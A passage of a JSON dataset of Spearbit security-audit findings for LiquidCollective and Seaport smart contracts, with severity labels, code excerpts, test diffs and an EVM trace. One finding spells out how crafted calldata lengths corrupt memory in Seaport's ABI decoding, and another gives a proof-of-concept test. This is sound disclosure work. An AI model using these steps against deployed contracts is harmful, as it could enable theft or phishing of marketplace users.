there could a maximum of 256 oracle members. This is due to the Report- sPosition setup where in an uint256, 1 bit is reserved for each oracle member's index. ReportsPositions.sol 63 Leave a comment/warning for the ReportsPosition setup that the ith bit in the uint256 represents whether or not there has been a beacon report by the ith oracle member. Oracle.1.sol#L202-L205 Leave a comment/warning that only there could a maximum of 256 oracle members. This is due to the Report- sPosition setup where in an uint256, 1 bit is reserved for each oracle member's index. Allowlist.1.sol#L46-L49 Leave a comment, warning that the permission bitmaps will be overwritten instead of them getting updated. OracleManager.1.sol#L44 Add more comment for _roundId to mention that when the setBeaconData is called by Oracle.1.sol:_push- ToRiver and that the value passed to it for this parameter is always the 1st epoch of a frame. OperatorsRegistry.1.sol#L304-L310 _indexes parameter, mentioning that this array: 1) needs to be duplicate-free and sorted (DESC) 2) each element in the array needs to be in a specific range, namely operator.[funded, keys). OperatorsRegistry.1.sol#L60-L62 Better rephrase the natspec comment to avoid further confusion. Oracle.1.sol#L284-L289 Update the reportBeacon natspec documentation about the _beaconValidators parameter to avoid further con- fusion. Client answer to the PR comment The docs should be updated to also reflect our plans for the Shanghai fork. Basically we can't just have the same behavior for a negative delta in validator count than with a positive delta (where we just assume that each validator that was in the queue only had 32 eth). Now when we exit validator we need to know how much was exited in order to compute the proper revenue value for the treasury and operator fee. This probably means that there will be an extra arg with the oracle to keep track of the exited eth value. But as long as the spec is not final, we'll stick to the validator count always growing. We should definitely add a custom error to explain that in case a report provides a smaller validator count.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unused imports from code",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "The codebase has unused imports across the code base. If they are not used inside the contract, it would be better to remove them to avoid confusion.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "Missing event emission in critical functions, init functions and setters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective-Spearbit-Security-Review.pdf",
        "body": "Some critical functions like contract's constructor, contract's init*(...)function (upgradable con- tracts) and some setter or in general critical functions are missing event emission. Event emissions are very useful for external web3 applications, but also for monitoring the usage and security of your protocol when paired with external monitoring tools. Note: in the init*(...)/constructor function, consider if adding a general broad event like ContractInitial- ized or split it in more specific events like QuorumUpdated+OwnerChanged+... 65 Note: in general, consider adding an event emission to all the init*(...) functions used to initialize the upgrad- able contracts, passing to the event the relevant args in addition to the version of the upgrade.",
        "labels": [
            "Spearbit",
            "LiquidCollective",
            "Severity: Informational"
        ]
    },
    {
        "title": "The spent offer amounts provided to OrderFulfilled for collection of (advanced) orders is not the actual amount spent in general",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When Seaport is called to fulfill or match a collection of (advanced) orders, the OrderFulfilled is called before applying fulfillments and executing transfers. The offer and consideration items have the following forms: C = (It , T , i, acurr , R, acurr ) O = (It , T , i, acurr , acurr ) Where parameter description It T i acurr R O C itemType token identifier the interpolation of startAmount and endAmount depending on the time and the fraction of the order. consideration item's recipient offer item. consideration item. The SpentItems and ReceivedItem items provided to OrderFulfilled event ignore the last component of the offer/consideration items in the above form since they are redundant. Seaport enforces that all consideration items are used. But for the endpoints in this context, we might end up with offer items with only a portion of their amounts being spent. So in the end O.acurr might not be the amount spent for this offer item, but OrderFulfilled emits O.acurr as the amount spent. This can cause discrepancies in off-chain bookkeeping by agents listening for this event. The fulfillOrder and fulfillAdvancedOrder do not have this issue, since all items are enforced to be used. These two endpoints also differ from when there are collections of (advanced) orders, in that they would emit the OrderFulfilled at the of their call before clearing the reentrancy guard.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "The spent offer item amounts shared with a zone for restricted (advanced) orders or with a contract offerer for orders of CONTRACT order type is not the actual spent amount in general",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When Seaport is called to fulfill or match a collection of (advanced) orders, there are scenarios where not all offer items will be used. When not all the current amount of an offer item is used and if this offer item belongs to an order which is of either CONTRACT order type or it is restricted order (and the caller is not the zone), then the spent amount shared with either the contract offerer or zone through their respective endpoints (validateOrder for zones and ratifyOrder for contract offerers) does not reflect the actual amount spent. When Seaport is called through one of its more complex endpoints to match or fulfill orders, the offer items go through a few phases: parameter description It T i as ae acurr O itemType token identifier startAmount endAmount the interpolation of startAmount and endAmount depending on the time and the fraction of the order. offer item.  Let's assume an offer item is originally O = (It , T , i, as, ae)  In _validateOrdersAndPrepareToFulfill, O gets transformed into (It , T , i, acurr , acurr )  Then depending on whether the order is part of a match (1, 2. 3) or fulfillment (1, 2) order and there is a corresponding fulfillment data pointing at this offer item, it might transform into (It , T , i, b, acurr ) where b 2 [0, 1). For fulfilling a collection of orders b 2 {0, acurr } depending on whether the offer item gets used or not, but for match orders, it can be in the more general range of b 2 [0, 1).  And finally for restricted or CONTRACT order types before calling _assertRestrictedAdvancedOrderValidity, the offer item would be transformed into (It , T , i, acurr , acurr ). So the startAmount of an offer item goes through the following flow: as ! acurr ! b 2 [0, 1) ! acurr 7 And at the end acurr is the amount used when Seaport calls into the validateOrder of a zone or ratifyOrder of a contract offerer. acurr does not reflect the actual amount that this offer item has contributed to a combined amount used for an execution transfer.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Empty criteriaResolvers for criteria-based contract orders",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "There is a deviation in how criteria-based items are resolved for contract orders. For contract orders which have offers with criteria, the _compareItems function checks that the contract offerer returned a corresponding non-criteria based itemType when identifierOrCriteria for the original item is 0, i.e., offering from an entire collection. Afterwards, the orderParameters.offer array is replaced by the offer array returned by the contract offerer. For other criteria-based orders such as offers with identifierOrCriteria = 0, the itemType of the order is only updated during the criteria resolution step. This means that for such offers there should be a corresponding CriteriaResolver struct. See the following test: 8 modified @@ -3568,9 +3568,8 @@ describe(`Advanced orders (Seaport v${VERSION})`, function () { test/advanced.spec.ts // Seller approves marketplace contract to transfer NFTs await set1155ApprovalForAll(seller, marketplaceContract.address, true); - - + const { root, proofs } = merkleTree([nftId]); const offer = [getTestItem1155WithCriteria(root, toBN(1), toBN(1))]; const offer = [getTestItem1155WithCriteria(toBN(0), toBN(1), toBN(1))]; const consideration = [ getItemETH(parseEther(\"10\"), parseEther(\"10\"), seller.address), @@ -3578,8 +3577,9 @@ describe(`Advanced orders (Seaport v${VERSION})`, function () { getItemETH(parseEther(\"1\"), parseEther(\"1\"), owner.address), ]; + - + // Replacing by `const criteriaResolvers = []` will revert const criteriaResolvers = [ buildResolver(0, 0, 0, nftId, proofs[nftId.toString()]), buildResolver(0, 0, 0, nftId, []), ]; const { order, orderHash, value } = await createOrder( However, in case of contract offers with identifierOrCriteria = 0, Seaport 1.2 does not expect a corresponding CriteriaResolver struct and will revert if one is provided as the itemType was updated to be the corresponding non-criteria based itemType. See advanced.spec.ts#L510 for a test case. Note: this also means that the fulfiller cannot explicitly provide the identifier when a contract order is being fulfilled. A malicious contract may use this to their advantage. For example, assume that a contract offerer in Seaport only accepts criteria-based offers. The fulfiller may first call previewOrder where the criteria is always resolved to a rare NFT, but the actual execution would return an uninteresting NFT. If such offers also required a corresponding resolver (similar behaviour as regular criteria based orders), then this could be fixed by explicitly providing the identifier--akin to a slippage check. In short, for regular criteria-based orders with identifierOrCriteria = 0 the fulfiller can pick which identifier to receive by providing a CriteriaResolver (as long as it's valid). For contract orders, fulfillers don't have this option and contracts may be able to abuse this.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Advance orders of CONTRACT order types can generate orders with less consideration items that would break the aggregation routine",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When Seaport gets a collection of advanced orders to fulfill or match, if one of the orders has a CON- TRACT order type, Seaport calls the generateOrder(...) endpoint of that order's offerer. generateOrder(...) can provide fewer consideration items for this order. So the total number of consideration items might be less than the ones provided by the caller. But since the caller would need to provide the fulfillment data beforehand to Seaport, they might use indices that would turn to be out of range for the consideration in question after the modification applied for the contract offerer above. If this happens, the whole call will be reverted. This issue is in the same category as Advance orders of CONTRACT order types can generate orders with different consideration recipients that would break the aggregation routine.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "AdvancedOrder.numerator and AdvancedOrder.denominator are unchecked for orders of CONTRACT or- der type",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "For most advanced order types, we have the following check: // Read numerator and denominator from memory and place on the stack. uint256 numerator = uint256(advancedOrder.numerator); uint256 denominator = uint256(advancedOrder.denominator); // Ensure that the supplied numerator and denominator are valid. if (numerator > denominator || numerator == 0) { _revertBadFraction(); } For CONTRACT order types this check is skipped. For later calculations (calculating the current amount) Seaport uses the numerator and denominator returned by _getGeneratedOrder which as a pair it's either (1, 1) or (0, 0). advancedOrder.numerator is only used to skip certain operations in some loops when it is 0:  Skip applying criteria resolvers. 10  Skip aggregating the amount for executions.  Skip the final validity check. Skipping the above operations would make sense. But when for an advancedOrder with CONTRACT order type _get- GeneratedOrder returns (h, 1, 1) and advancedOrder.numerator == 0, we would skip applying criteria resolvers, aggregating the amounts from offer or consideration amounts for this order and skip the final validity check that would call into the ratifyOrder endpoint of the offerer. But emiting the following OrderFulfilled will not be skipped, even though this advancedOrder will not be used. // Emit an OrderFulfilled event. _emitOrderFulfilledEvent( orderHash, orderParameters.offerer, orderParameters.zone, recipient, orderParameters.offer, orderParameters.consideration ); This can create discrepancies between what happens on chain and what off-chain agents index/record.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Calls to PausableZone's executeMatchAdvancedOrders and executeMatchOrders would revert if un- used native tokens would need to be returned",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "In match (advanced) orders, one can provide native tokens as offer and consideration items. So a PausableZone would need to provide msg.value to call the corresponding Seaport endpoints. There are a few scenarios where not all the msg.value native tokens amount provided to the Seaport marketplace will be used: 1. Rounding errors in calculating the current amount of offer or consideration items. The zone can prevent send- ing extra native tokens to Seaport by pre-calculating these values and making sure to have its transaction to be included in the specific block that these values were calculated for (this is important when the start and end amount of an item are not equal). 2. The zone (un)intentionally sends more native tokens that it is necessary to Seaport. 3. The (advanced) orders sent for matching in Seaport include order type of CONTRACT offerer order and the of- ferer contract provides different amount for at least one item that would eventually make the whole transaction not use the full amount of msg.value provided to it. In all these cases, since PausableZone does not have a receive or fallback endpoint to accept native tokens, when Seaport tries to send back the unsued native token amount the transaction may revert. PausableZone not accepting native tokens: $ export CODE=$(jq -r '.deployedBytecode' artifacts/contracts/zones/PausableZone.sol/PausableZone.json | tr -d '\\n') ,! $ evm --code $CODE --value 1 --prestate genesis.json --sender ,! 0xb4d0000000000000000000000000000000000000 --nomemory=false --debug run $ evm --input $(echo $CODE | head -c 44 - | sed -E s/0x//) disasm 6080806040526004908136101561001557600080fd 00000: PUSH1 0x80 00002: DUP1 00003: PUSH1 0x40 00005: MSTORE 00006: PUSH1 0x04 00008: SWAP1 00009: DUP2 0000a: CALLDATASIZE 0000b: LT 0000c: ISZERO 0000d: PUSH2 0x0015 00010: JUMPI 00011: PUSH1 0x00 00013: DUP1 00014: REVERT trace of evm ... --debug run error: execution reverted #### TRACE #### PUSH1 pc=00000000 gas=4700000 cost=3 DUP1 pc=00000002 gas=4699997 cost=3 12 Stack: 00000000 0x80 PUSH1 Stack: 00000000 00000001 MSTORE Stack: 00000000 00000001 00000002 PUSH1 Stack: 00000000 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 SWAP1 Stack: 00000000 00000001 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 DUP2 Stack: 00000000 00000001 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 pc=00000003 gas=4699994 cost=3 pc=00000005 gas=4699991 cost=12 pc=00000006 gas=4699979 cost=3 0x80 0x80 0x40 0x80 0x80 0x80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000008 gas=4699976 cost=3 0x4 0x80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000009 gas=4699973 cost=3 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000010 gas=4699970 cost=2 0x4 0x80 0x4 CALLDATASIZE Stack: 00000000 00000001 00000002 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| 13 LT Stack: 00000000 00000001 00000002 00000003 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 ISZERO Stack: 00000000 00000001 00000002 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 PUSH2 Stack: 00000000 00000001 00000002 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 JUMPI Stack: 00000000 00000001 00000002 00000003 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 PUSH1 Stack: 00000000 00000001 Memory: 00000000 00000010 00000020 pc=00000011 gas=4699968 cost=3 0x0 0x4 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000012 gas=4699965 cost=3 0x1 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000013 gas=4699962 cost=3 0x0 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000016 gas=4699959 cost=10 0x15 0x0 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000017 gas=4699949 cost=3 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 14 00000030 00000040 00000050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| DUP1 Stack: 00000000 00000001 00000002 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 REVERT Stack: 00000000 00000001 00000002 00000003 Memory: 00000000 00000010 00000020 00000030 00000040 00000050 pc=00000019 gas=4699946 cost=3 0x0 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| pc=00000020 gas=4699943 cost=0 0x0 0x0 0x80 0x4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 00 |................| 00 00 00 00 00 00 00 80 |................| #### LOGS #### genesis.json: { \"gasLimit\": \"4700000\", \"difficulty\": \"1\", \"alloc\": { \"0xb4d0000000000000000000000000000000000000\": { \"balance\": \"10000000000000000000000000\", \"code\": \"\", \"storage\": {} } } } // file: test/zone.spec.ts ... it(\"Fulfills an order with executeMatchAdvancedOrders with NATIVE Consideration Item\", async () => { const pausableZoneControllerFactory = await ethers.getContractFactory( \"PausableZoneController\", owner ); const pausableZoneController = await pausableZoneControllerFactory.deploy( owner.address ); // Deploy pausable zone const zoneAddr = await createZone(pausableZoneController); 15 // Mint NFTs for use in orders const nftId = await mintAndApprove721(seller, marketplaceContract.address); // Define orders const offerOne = [ getTestItem721(nftId, toBN(1), toBN(1), undefined, testERC721.address), ]; const considerationOne = [ getOfferOrConsiderationItem( 0, ethers.constants.AddressZero, toBN(0), parseEther(\"0.01\"), parseEther(\"0.01\"), seller.address ), ]; const { order: orderOne, orderHash: orderHashOne } = await createOrder( seller, zoneAddr, offerOne, considerationOne, 2 ); const offerTwo = [ getOfferOrConsiderationItem( 0, ethers.constants.AddressZero, toBN(0), parseEther(\"0.01\"), parseEther(\"0.01\"), undefined ), ]; const considerationTwo = [ getTestItem721( nftId, toBN(1), toBN(1), buyer.address, testERC721.address ), ]; const { order: orderTwo, orderHash: orderHashTwo } = await createOrder( buyer, zoneAddr, offerTwo, considerationTwo, 2 ); const fulfillments = [ [[[0, 0]], [[1, 0]]], [[[1, 0]], [[0, 0]]], ].map(([offerArr, considerationArr]) => toFulfillment(offerArr, considerationArr) ); // Perform the match advanced orders with zone const tx = await pausableZoneController .connect(owner) 16 .executeMatchAdvancedOrders( zoneAddr, marketplaceContract.address, [orderOne, orderTwo], [], fulfillments, { value: parseEther(\"0.01\").add(1) } // the extra 1 wei reverts the tx ); // Decode all events and get the order hashes const orderFulfilledEvents = await decodeEvents(tx, [ { eventName: \"OrderFulfilled\", contract: marketplaceContract }, ]); expect(orderFulfilledEvents.length).to.equal(fulfillments.length); // Check that the actual order hashes match those from the events, in order const actualOrderHashes = [orderHashOne, orderHashTwo]; orderFulfilledEvents.forEach((orderFulfilledEvent, i) => expect(orderFulfilledEvent.data.orderHash).to.be.equal( actualOrderHashes[i] ) ); }); ... This bug also applies to Seaport 1.1 and PausableZone (0x004C00500000aD104D7DBd00e3ae0A5C00560C00)",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "ABI decoding for bytes: memory can be corrupted by maliciously constructing the calldata",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "In the code snippet below, size can be made 0 by maliciously crafting the calldata. In this case, the free memory is not incremented. assembly { mPtrLength := mload(0x40) let size := and( add( and(calldataload(cdPtrLength), OffsetOrLengthMask), AlmostTwoWords ), OnlyFullWordMask ) calldatacopy(mPtrLength, cdPtrLength, size) mstore(0x40, add(mPtrLength, size)) } This has two different consequences: 1. If the memory offset mPtrLength is immediately used then junk values at that memory location can be interpreted as the decoded bytes type. In the case of Seaport 1.2, the likelihood of the current free memory pointing to junk value is low. So, this case has low severity. 17 2. The consequent memory allocation will also use the value mPtrLength to store data in memory. This can lead to corrupting the initial memory data. In the worst case, the next allocation can be tuned so that the first bytes data can be any arbitrary data. To make the size calculation return 0: 1. Find a function call which has bytes as a (nested) parameter. 2. Modify the calldata field where the length of the above byte is stored to the new length 0xffffe0. 3. The calculation will now return size = 0. Note: there is an additional requirement that this bytes type should be inside a dynamic struct. Otherwise, for example, in case of function foo(bytes calldata signature) , the compiler will insert a check that calldata- size is big enough to fit signature.length. Since the value 0xffffe0 is too big to be fit into calldata, such an attack is impractical. However, for bytes type inside a dynamic type, for example in function foo(bytes[] calldata signature), this check is skipped by solc (likely because it's expensive). For a practical exploit we need to look for such function. In case of Seaport 1.2 this could be the matchAdvancedOrders(AdvancedOrder[] calldata orders, ...) function. The struct AdvancedOrder has a nested parameter bytes signature as well as bytes extraData. In the above exploit one would be able to maliciously modify the calldata in such a way that Seaport would interpret the data in extraData as the signature. Here is a proof of concept for a simplified case that showcases injecting an arbitrary value into a decoded bytes. As for severity, even though interpreting calldata differently may not fundamentally break the protocol, an attacker with enough effort may be able to use this for subtle phishing attacks or as a precursor to other attacks.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Advance orders of CONTRACT order types can generate orders with different consideration recipients that would break the aggregation routine",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When Seaport receives a collection of advanced orders to match or fulfill, if one of the orders has a CONTRACT order type, Seaport calls the generateOrder(...) endpoint of that order's offerer. genera- teOrder(...) can provide new consideration item recipients for this order. These new recipients are going to be used for this order from this point on. In _getGeneratedOrder, there is no comparison between old or new consideration recipients. The provided new recipients can create an issue when aggregating consideration items. Since the fulfillment data is provided beforehand by the caller of the Seaport endpoint, the caller might have provided fulfillment aggregation data that would have aggregated/combined one of the consideration items of this changed advance order with another consideration item. But the aggregation had taken into consideration the original recipient of the order in question. Multiple consideration items can only be aggregated if they share the same itemType, token, identi- fier, and recipient (ref). The new recipients provided by the contract offerer can break this invariant and in turn cause a revert.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "CriteriaResolvers.criteriaProof is not validated in the identifierOrCriteria == 0 case",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "In the case of identifierOrCriteria == 0, the criteria resolver completely skips any validations on the Merkle proof and in particular is missing the validation that CriteriaResolvers.criteriaProof.length == 0. Note: This is also present in Seaport 1.1 and may be a known issue. Proof of concept: modified @@ -3568,9 +3568,8 @@ describe(`Advanced orders (Seaport v${VERSION})`, function () { test/advanced.spec.ts // Seller approves marketplace contract to transfer NFTs await set1155ApprovalForAll(seller, marketplaceContract.address, true); - - + const { root, proofs } = merkleTree([nftId]); const offer = [getTestItem1155WithCriteria(root, toBN(1), toBN(1))]; const offer = [getTestItem1155WithCriteria(toBN(0), toBN(1), toBN(1))]; const consideration = [ getItemETH(parseEther(\"10\"), parseEther(\"10\"), seller.address), @@ -3578,8 +3577,9 @@ describe(`Advanced orders (Seaport v${VERSION})`, function () { getItemETH(parseEther(\"1\"), parseEther(\"1\"), owner.address), ]; + - + // Add a junk criteria proof and the test still passes const criteriaResolvers = [ buildResolver(0, 0, 0, nftId, proofs[nftId.toString()]), buildResolver(0, 0, 0, nftId, ,! [\"0xdead000000000000000000000000000000000000000000000000000000000000\"]), ]; const { order, orderHash, value } = await createOrder(",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Calls to TypehashDirectory will be successful",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "TypehashDirectory's deployed bytecode starts with 00 which corresponds to STOP opcode (SSTORE2 also uses this pattern). This choice for the 1st bytecode causes accidental calls to the contract to succeed silently.",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_isValidBulkOrderSize does not perform the signature length validation correctly.",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "In _isValidBulkOrderSize the signature's length validation is performed as follows: let length := mload(signature) validLength := and( lt(length, BulkOrderProof_excessSize), lt(and(sub(length, BulkOrderProof_minSize), AlmostOneWord), 2) ) The sub opcode in the above snippet wraps around. If this was the correct formula then it would actually simplify to: lt(and(sub(length, 3), AlmostOneWord), 2) The simplified and the current version would allow length to also be 3, 4, 35, 36, 67, 68 but _isValidBulkOrder- Size actually needs to check that length ( l ) has the following form: where x 2 f0, 1g and y 2 f1, 2, (cid:1) (cid:1) (cid:1) , 24g ( y represents the height/depth of the bulk order).",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "When contractNonce occupies more than 12 bytes the truncated nonce shared back with the contract offerer through ratifyOrder would be smaller than the actual stored nonce",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When contractNonce occupies more than 12 bytes the truncated nonce shared back with the con- tract offerer through ratifyOrder would be smaller than the actual stored nonce: // Write contractNonce to calldata dstHead.offset(ratifyOrder_contractNonce_offset).write( uint96(uint256(orderHash)) ); This is due to the way the contractNonce and the offerer's address are mixed in the orderHash: assembly { orderHash := or(contractNonce, shl(0x60, offerer)) }",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "abi_decode_bytes does not mask the copied data length",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "When abi_decode_bytes decodes bytes, it does not mask the copied length of the data in memory (other places where the length is masked by OffsetOrLengthMask).",
        "labels": [
            "Spearbit",
            "Seaport",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "OrderHash in the context of contract orders need not refer to a unique order",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Seaport-Spearbit-Security-Review.pdf",
        "body": "In Seaport 1.1 and in Seaport 1.2 for non-contract orders, order hashes have a unique correspon- dence with the order, i.e., it can be used to identify the status of an order on-chain and track it. However, in case of contract orders, this is not the case. It is simply the current nonce of the offerer, combined with the address. This cannot be used to uniquely track an order on-chain. uint256 contractNonce; unchecked { contractNonce = _contractNonces[offerer]++; } assembly { orderHash := or(contractNonce, shl(0x60, offerer)) } Here are some example scenarios where this can be problematic: Scenario 1: A reverted contract order and the adjacent succeeding contract order will have the same order hash, regardless of whether they correspond to the same order. 1. Consider Alice calling fulfilledAdvancedOrder for a contract order with offerer = X, where X is a smart contract that offers contract orders on Seaport 1.2. Assume that this transaction failed because enough gas was not provided for the generateOrder call. This tx would revert with a custom error InvalidContrac- tOrder, generated from OrderValidator.sol#L391. 22 2. Consider Bob calling fulfilledAdvancedOrder for a different contract order with offerer = X, same smart contract offerer. OrderFulfiller.sol#L124 This order will succeed and emit the OrderFulfilled event the from In the above scenario, there are two different orders, one that reverted on-chain and the other that succeeded, both having the same orderHash despite the orders only sharing the same contract offerer--the other parameters can be completely arbitrary. Scenario 2: Contract order hashes computed off-chain can be misleading. 1. Consider Alice calling fulfilledAdvancedOrder for a contract order with offerer = X, where X is a smart contract that offers contract orders on Seaport 1.2. Alice computed the orderHash of their order off-chain by simulating the transaction, sends the transaction and polls the OrderFulfilled event with the same orderHash to know if the order has been fulfilled. 2. Consider Bob calling fulfilledAdvancedOrder for any contract order with offerer = X, the same smart contract offerer. 3. Bob's transaction gets included first. An OrderFulfilled event is emitted, with the orderHash to be the same hash that Alice computed off-chain! Alice may believe that their order succeeded. for non-contract Orders, the above approach would be valid, i.e., one may generate and sign an order, Note: compute the order hash of an order off-chain and poll for an OrderFulfilled with the order hash to know that it was fulfilled. Note: even though there is an easier way to track if the order succeeded in these cases, in the general case, Alice or Bob need not be the one executing the orders on-chain. And an off-chain agent may send misleading notifications to either parties that their order succeeded due to this quirk with contract order hashes.",
